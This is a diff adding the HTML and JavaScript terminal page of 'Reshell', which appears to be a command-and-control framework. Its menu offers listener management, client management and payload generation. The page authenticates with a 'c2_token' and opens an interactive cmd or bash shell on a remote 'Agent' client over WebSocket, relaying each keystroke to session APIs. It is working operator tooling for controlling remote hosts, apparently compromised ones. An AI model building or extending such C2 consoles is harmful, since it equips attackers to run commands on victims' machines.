@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>终端交互 - Reshell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/ruoyi.css">
+    <!-- xterm.js 本地静态资源 -->
+    <link rel="stylesheet" href="/static/xterm/xterm.css">
+    <script src="/static/xterm/xterm.js"></script>
+</head>
+<body>
+<div class="layout-wrapper">
+    <aside class="layout-sidebar">
+        <div class="logo">
+            <span>Reshell</span>
+        </div>
+        <ul class="layout-menu">
+            <li><a href="/dashboard">仪表盘</a></li>
+            <li><a href="/listeners">监听管理</a></li>
+            <li><a href="/clients" class="active">客户端管理</a></li>
+            <li><a href="/payloads">载荷生成</a></li>
+        </ul>
+    </aside>
+
+    <div class="layout-main">
+        <header class="layout-header">
+            <div class="layout-header-title">终端 - 客户端 #{{.ClientID}}</div>
+            <div class="layout-header-actions">
+                <a href="/client/{{.ClientID}}" class="btn btn-outline-secondary btn-sm">返回设备详情</a>
+                <button class="btn btn-outline-danger btn-sm" onclick="logout()">退出登录</button>
+            </div>
+        </header>
+
+        <main class="layout-content">
+            <div class="breadcrumb-bar">首页 / 客户端管理 / 终端</div>
+
+            <div class="card mb-2">
+                <div class="small text-muted px-3 py-2 border-bottom">
+                    说明：使用 <strong>WebSocket 实时交互式 Shell</strong>。Windows 由 Agent 创建 <strong>cmd</strong>（默认<strong>行缓冲</strong>+本地回显，适配匿名管道）；URL 加 <code>?stream_shell=1</code> 可逐键且<strong>仅远端回显</strong>（适合 ConPTY）。Linux 使用 <strong>bash PTY</strong>，默认<strong>逐键、仅远端回显</strong>（与 SSH 一致，避免本地与 PTY 双重回显导致「一行打两遍」）；加 <code>?line_shell=1</code> 可强制行缓冲（一般不推荐）。
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <span>远程 Shell（交互式）</span>
+                    <div>
+                        <button id="connectBtn" class="btn btn-sm btn-outline-success" onclick="connectShell()">连接</button>
+                        <button id="disconnectBtn" class="btn btn-sm btn-outline-danger" onclick="disconnectShell()" disabled>断开</button>
+                        <button class="btn btn-sm btn-outline-secondary" onclick="clearTerminal()">清屏</button>
+                    </div>
+                </div>
+                <div class="card-body p-0">
+                    <div id="xterm-container" tabindex="0" role="textbox" aria-label="终端输入区" style="height:500px;background:#000;outline:none;"></div>
+                </div>
+            </div>
+        </main>
+    </div>
+</div>
+
+<script src="/static/bootstrap.bundle.min.js"></script>
+<script>
+    const clientId = '{{.ClientID}}';
+    let term;
+    const CWD_MARKER = '__C2CWD__=';
+    let ws;
+    let sessionId = null;
+    let connected = false;
+    let shellInputQueue = [];
+    let shellInputDraining = false;
+    /** 当前行仅由用户本地键入的部分（仅行缓冲模式使用） */
+    let localLineBuffer = '';
+    /**
+     * true：Windows 默认。本地回显 + 回车发整行，适配 cmd 管道。
+     * false：Linux 默认或 ?stream_shell=1。逐键发送且不在此做本地回显，显示完全来自 PTY/shell_output（避免与远端 echo 叠成两行）。
+     */
+    let useLineBufferShell = !window.location.search.includes('stream_shell=1');
+
+    function stripLastUnicodeChar(s) {
+        if (!s) return '';
+        const code = s.codePointAt(s.length - 1);
+        if (code === undefined) return s.slice(0, -1);
+        const take = code > 0xffff ? 2 : 1;
+        return s.slice(0, s.length - take);
+    }
+
+    /** 全链路用 Base64 传 UTF-8 字节，避免 JSON 对 \\b \\r \\u0008 转义与 Agent 解析不一致。 */
+    function utf8TextToBase64(s) {
+        if (typeof TextEncoder !== 'undefined') {
+            const bytes = new TextEncoder().encode(s);
+            let bin = '';
+            for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+            return btoa(bin);
+        }
+        return btoa(unescape(encodeURIComponent(s)));
+    }
+
+    function logout() {
+        localStorage.removeItem('c2_token');
+        document.cookie = 'c2_token=; Max-Age=0; path=/';
+        window.location.href = '/login';
+    }
+
+    function getToken() {
+        return localStorage.getItem('c2_token') || '';
+    }
+
+    async function fetchJSON(url, opts = {}) {
+        opts.headers = Object.assign({
+            'Authorization': 'Bearer ' + getToken(),
+            'Content-Type': 'application/json'
+        }, opts.headers || {});
+        const res = await fetch(url, opts);
+        if (res.status === 401) {
+            window.location.href = '/login';
+            return null;
+        }
+        const data = await res.json().catch(function () { return {}; });
+        if (!res.ok) {
+            var err = new Error(data.error || data.message || ('HTTP ' + res.status));
+            err.payload = data;
+            err.httpStatus = res.status;
+            throw err;
+        }
+        return data;
+    }
+
+    function cmdStatus(d) {
+        if (!d) return '';
+        return d.status !== undefined ? d.status : d.Status;
+    }
+    function cmdResult(d) {
+        if (!d) return '';
+        return d.result !== undefined ? d.result : d.Result;
+    }
+
+    function parseTerminalOutput(raw) {
+        const out = String(raw || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
+        const lines = out.split('\n');
+        let cwd = '';
+        const kept = [];
+        for (let i = 0; i < lines.length; i++) {
+            const ln = lines[i];
+            if (ln.startsWith(CWD_MARKER)) {
+                cwd = ln.slice(CWD_MARKER.length).trim();
+            } else {
+                kept.push(ln);
+            }
+        }
+        while (kept.length > 0 && kept[kept.length - 1] === '') kept.pop();
+        return { output: kept.join('\n'), cwd: cwd };
+    }
+
+    function initTerminal() {
+        if (typeof Terminal === 'undefined') {
+            var el = document.getElementById('xterm-container');
+            el.innerHTML = '<div class="p-3 text-danger">xterm 未加载：请确认存在 <code>/static/xterm/xterm.js</code> 与 <code>xterm.css</code> 后刷新页面。</div>';
+            return;
+        }
+        var container = document.getElementById('xterm-container');
+        term = new Terminal({
+            cols: 120,
+            rows: 40,
+            fontSize: 13,
+            theme: { background: '#000000', foreground: '#ffffff' }
+        });
+        term.open(container);
+        term.writeln('\x1b[33mRemote Interactive Shell\x1b[0m');
+        term.writeln('\x1b[36m请点击"连接"按钮建立交互式会话\x1b[0m');
+        term.onData(handleTermData);
+        // 点击终端区域获得焦点，避免“黑框无交互”
+        container.addEventListener('click', function () { term.focus(); });
+        container.addEventListener('focus', function () { term.focus(); });
+        term.focus();
+    }
+
+    /**
+     * 本地回显 + 行内缓冲：退格只删除本行里用户自己键入的字符，不破坏远端发来的提示符路径。
+     */
+    function handleTermData(data) {
+        if (!connected) {
+            term.writeln('\x1b[31m错误：请先点击"连接"按钮建立会话\x1b[0m');
+            return;
+        }
+        if (data.length === 0) return;
+
+        if (!useLineBufferShell) {
+            handleTermDataStream(data);
+            return;
+        }
+
+        // 退格：常见为 \x7f；部分环境为 \b 或单字符 Unicode DEL
+        const isBs = (data === '\x7f' || data === '\x08' || data === '\b' ||
+            (data.length === 1 && data.charCodeAt(0) === 127));
+        if (isBs) {
+            if (localLineBuffer.length === 0) return;
+            localLineBuffer = stripLastUnicodeChar(localLineBuffer);
+            term.write('\b \b');
+            return;
+        }
+
+        if (data === '\n' || data === '\r' || data === '\r\n') {
+            const line = localLineBuffer;
+            localLineBuffer = '';
+            term.write('\r\n');
+            queueShellInput(line + '\r\n');
+            return;
+        }
+
+        if (data === '\x03') {
+            localLineBuffer = '';
+            term.write('^C\r\n');
+            queueShellInput('\x03');
+            return;
+        }
+
+        if (data.charCodeAt(0) === 0x1b && data.length > 1) {
+            queueShellInput(data);
+            return;
+        }
+
+        localLineBuffer += data;
+        term.write(data);
+    }
+
+    /** 逐键发送：不在此 term.write，显示仅来自远端 shell_output（PTY 回显），避免「本地一行 + 远端一行」。 */
+    function handleTermDataStream(data) {
+        if (data.length === 0) return;
+        queueShellInput(data);
+    }
+
+    /** 彻底关掉用户 /ws，并去掉 onclose，避免旧连接晚到的 close 把新一轮 sessionId 清掉 */
+    function closeUserWebSocket() {
+        return new Promise(function(resolve) {
+            if (!ws) {
+                resolve();
+                return;
+            }
+            var old = ws;
+            ws = null;
+            connected = false;
+            old.onmessage = null;
+            old.onerror = null;
+            old.onclose = null;
+            try {
+                old.close(1000, 'cleanup');
+            } catch (e) {}
+            setTimeout(resolve, 200);
+        });
+    }
+
+    async function connectShell() {
+        try {
+            await closeUserWebSocket();
+            shellInputQueue = [];
+            localLineBuffer = '';
+            sessionId = null;
+            connected = false;
+
+            // 须先建立浏览器 WebSocket 并挂上 onmessage，再 POST 创建会话。
+            // 否则服务端会先下发 shell_session_create，bash 首帧提示符在 /ws 订阅前就广播完，终端永远空白。
+            term.writeln('\x1b[32m正在连接 WebSocket …\x1b[0m');
+            const token = getToken();
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsURL = wsProtocol + '//' + window.location.host + '/ws?token=' + encodeURIComponent(token);
+
+            await new Promise((resolve, reject) => {
+                let settled = false;
+                const ok = () => {
+                    if (settled) return;
+                    settled = true;
+                    resolve();
+                };
+                const bad = (msg) => {
+                    if (settled) return;
+                    settled = true;
+                    reject(new Error(msg || 'WebSocket 失败'));
+                };
+
+                ws = new WebSocket(wsURL);
+
+                ws.onmessage = function(event) {
+                    try {
+                        const msg = JSON.parse(event.data);
+                        if (msg.type !== 'shell_output') return;
+                        const inner = msg.data;
+                        if (!inner || typeof inner !== 'object') return;
+                        if (String(inner.client_id) !== String(clientId) || String(inner.session_id) !== String(sessionId)) return;
+                        if (inner.data != null) {
+                            term.write(String(inner.data));
+                            try { term.scrollToBottom(); } catch (e) {}
+                        }
+                    } catch (e) {
+                        console.error('WebSocket message error:', e);
+                    }
+                };
+
+                ws.onclose = function(ev) {
+                    if (!term) return;
+                    connected = false;
+                    shellInputQueue = [];
+                    localLineBuffer = '';
+                    sessionId = null;
+                    document.getElementById('connectBtn').disabled = false;
+                    document.getElementById('disconnectBtn').disabled = true;
+                    var code = ev && ev.code !== undefined ? ev.code : 0;
+                    if (code !== 1000) {
+                        term.writeln('\x1b[31mWebSocket连接已关闭\x1b[0m');
+                    }
+                    bad('WebSocket 已关闭');
+                };
+
+                ws.onerror = function() {
+                    term.writeln('\x1b[31mWebSocket 连接错误\x1b[0m');
+                    bad('WebSocket error');
+                };
+
+                ws.onopen = function() {
+                    connected = true;
+                    term.writeln('\x1b[32mWebSocket 已就绪，正在创建 Shell 会话…\x1b[0m');
+                    ok();
+                };
+            });
+
+            const sessionData = await fetchJSON('/api/clients/' + clientId + '/session', {
+                method: 'POST',
+                body: JSON.stringify({type: 'shell'})
+            });
+            sessionId = (sessionData.ID !== undefined && sessionData.ID !== null) ? sessionData.ID : sessionData.id;
+
+            document.getElementById('connectBtn').disabled = true;
+            document.getElementById('disconnectBtn').disabled = false;
+            term.writeln('\x1b[32m会话已创建 (ID ' + sessionId + ')。下方应出现 Shell 提示符；若无，请键入回车。\x1b[0m');
+        } catch (e) {
+            await closeUserWebSocket();
+            sessionId = null;
+            connected = false;
+            term.writeln('\x1b[31m创建会话失败: ' + (e.message || e) + '\x1b[0m');
+        }
+    }
+
+    async function disconnectShell() {
+        var apiErr = null;
+        try {
+            if (sessionId) {
+                try {
+                    await fetchJSON('/api/sessions/' + sessionId, { method: 'DELETE' });
+                } catch (e) {
+                    apiErr = e && (e.message || e);
+                }
+            }
+        } finally {
+            await closeUserWebSocket();
+            sessionId = null;
+            shellInputQueue = [];
+            localLineBuffer = '';
+            document.getElementById('connectBtn').disabled = false;
+            document.getElementById('disconnectBtn').disabled = true;
+            if (apiErr) {
+                term.writeln('\x1b[33m关闭会话接口异常: ' + apiErr + '（本地已断开，可再次点「连接」）\x1b[0m');
+            }
+            term.writeln('\x1b[32m会话已断开\x1b[0m');
+        }
+    }
+
+    async function postSessionInputOnce(input) {
+        await fetchJSON('/api/sessions/' + sessionId + '/input', {
+            method: 'POST',
+            body: JSON.stringify({ input_b64: utf8TextToBase64(input) })
+        });
+    }
+
+    async function drainShellInputQueue() {
+        if (shellInputDraining) return;
+        shellInputDraining = true;
+        try {
+            while (shellInputQueue.length > 0 && sessionId) {
+                const chunk = shellInputQueue.shift();
+                if (chunk == null || chunk.length === 0) continue;
+                await postSessionInputOnce(chunk);
+            }
+        } catch (e) {
+            term.writeln('\x1b[31m发送输入失败: ' + (e.message || e) + '\x1b[0m');
+        } finally {
+            shellInputDraining = false;
+            if (shellInputQueue.length > 0 && sessionId) {
+                drainShellInputQueue();
+            }
+        }
+    }
+
+    function queueShellInput(input) {
+        if (!sessionId || !input || input.length === 0) return;
+        shellInputQueue.push(input);
+        drainShellInputQueue();
+    }
+
+    function clearTerminal() {
+        if (term) {
+            term.clear();
+        }
+    }
+
+    async function applyShellModeForClientOS() {
+        try {
+            const d = await fetchJSON('/api/clients/' + clientId);
+            const rawOs = d.os_type != null ? d.os_type : d.OSType;
+            const os = String(rawOs || '').toLowerCase();
+            if (os.indexOf('linux') >= 0) {
+                useLineBufferShell = false;
+            }
+            if (window.location.search.includes('line_shell=1') &&
+                !window.location.search.includes('stream_shell=1')) {
+                useLineBufferShell = true;
+            }
+        } catch (e) {
+            /* 拉取失败时保持 URL/默认推断 */
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+        await applyShellModeForClientOS();
+        initTerminal();
+    });
+</script>
+</body>
+</html>
